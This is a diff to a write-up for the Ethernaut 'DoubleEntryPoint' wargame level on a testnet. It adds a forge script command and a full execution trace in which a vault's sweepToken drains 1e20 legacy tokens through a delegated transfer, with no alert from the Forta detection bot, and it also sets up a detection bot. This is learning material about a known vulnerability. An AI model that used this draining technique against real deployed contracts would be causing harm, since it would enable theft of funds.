@@ -60,7 +60,7 @@ Traces:
     ├─ [2404] 0xD34d38b269c9523a9329833B228a46D3b44ABD21::cryptoVault() [staticcall]
     │   └─ ← [Return] 0xE94cF7F7F221cd103f882C6E3e04fC4f6681B07f # CryptoVault contract
     ├─ [2347] 0xE94cF7F7F221cd103f882C6E3e04fC4f6681B07f::underlying()
-    │   └─ ← [Return] 0xD34d38b269c9523a9329833B228a46D3b44ABD21 # Ethernaut contract
+    │   └─ ← [Return] 0xD34d38b269c9523a9329833B228a46D3b44ABD21 # DoubleEntryPoint/Ethernaut contract
     ├─ [2383] 0xD34d38b269c9523a9329833B228a46D3b44ABD21::delegatedFrom() [staticcall]
     │   └─ ← [Return] 0x72B92c2c00971CAa02097E86ee578f650066C2BA # Legacy token contract
     ├─ [0] VM::stopBroadcast()
@@ -73,8 +73,38 @@ Traces:
 ```bash
 forge script script/DeployDoubleEntryPointAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy
 
-# https://sepolia.etherscan.io/tx/0x18b195dd95ce6a53b5ec8e7a13bc7d1306cf85ac59a5384e80fe76e51afd3f78
-# https://sepolia.etherscan.io/token/0x9fc00a7f729ac7b226b7f626db04e4280f264de7#balances
+Traces:
+  [116080] DeployDoubleEntryPointAttack::run()
+    ├─ [0] VM::startBroadcast()
+    │   └─ ← [Return] 
+    ├─ [2404] 0xD34d38b269c9523a9329833B228a46D3b44ABD21::cryptoVault() [staticcall]
+    │   └─ ← [Return] 0xE94cF7F7F221cd103f882C6E3e04fC4f6681B07f
+    ├─ [2347] 0xE94cF7F7F221cd103f882C6E3e04fC4f6681B07f::underlying() [staticcall]
+    │   └─ ← [Return] 0xD34d38b269c9523a9329833B228a46D3b44ABD21
+    ├─ [2383] 0xD34d38b269c9523a9329833B228a46D3b44ABD21::delegatedFrom() [staticcall]
+    │   └─ ← [Return] 0x72B92c2c00971CAa02097E86ee578f650066C2BA
+    ├─ [57067] 0xE94cF7F7F221cd103f882C6E3e04fC4f6681B07f::sweepToken(0x72B92c2c00971CAa02097E86ee578f650066C2BA)
+    │   ├─ [2557] 0x72B92c2c00971CAa02097E86ee578f650066C2BA::balanceOf(0xE94cF7F7F221cd103f882C6E3e04fC4f6681B07f) [staticcall]
+    │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   ├─ [48677] 0x72B92c2c00971CAa02097E86ee578f650066C2BA::transfer(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, 100000000000000000000 [1e20])
+    │   │   ├─ [45519] 0xD34d38b269c9523a9329833B228a46D3b44ABD21::delegateTransfer(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, 100000000000000000000 [1e20], 0xE94cF7F7F221cd103f882C6E3e04fC4f6681B07f)
+    │   │   │   ├─ [2573] 0xEA5834D9F6189326C6d687c78CE3B5E97fba190C::usersDetectionBots(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   ├─ [2541] 0xEA5834D9F6189326C6d687c78CE3B5E97fba190C::botRaisedAlerts(0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [758] 0xEA5834D9F6189326C6d687c78CE3B5E97fba190C::notify(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, 0x9cd1a12100000000000000000000000064dd9d94818a2ca2e95c31b084aef0cc92e86da20000000000000000000000000000000000000000000000056bc75e2d63100000000000000000000000000000e94cf7f7f221cd103f882c6e3e04fc4f6681b07f)
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ emit Transfer(from: 0xE94cF7F7F221cd103f882C6E3e04fC4f6681B07f, to: 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, value: 100000000000000000000 [1e20])
+    │   │   │   ├─ [541] 0xEA5834D9F6189326C6d687c78CE3B5E97fba190C::botRaisedAlerts(0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop] 
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    └─ ← [Stop] 
+
+# https://sepolia.etherscan.io/tx/0xceeaea7cee765e3f8c80d5fc1445b90f404f7964543bf80894f985854fd0815d
 ```
 
 ## Forta Bot
@@ -82,6 +112,7 @@ forge script script/DeployDoubleEntryPointAttack.s.sol --rpc-url $ALCHEMY_RPC_UR
 1.
 
 ```bash
+# Forta contract= 0xEA5834D9F6189326C6d687c78CE3B5E97fba190C
 forge create FortaBot --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --legacy --constructor-args 0xD94c78bBAB898777CbD847CfCf3d2B2917516F27
 
 # https://sepolia.etherscan.io/address/0x0CA7964911b3F29Cdba8C74853af729701A1Db63
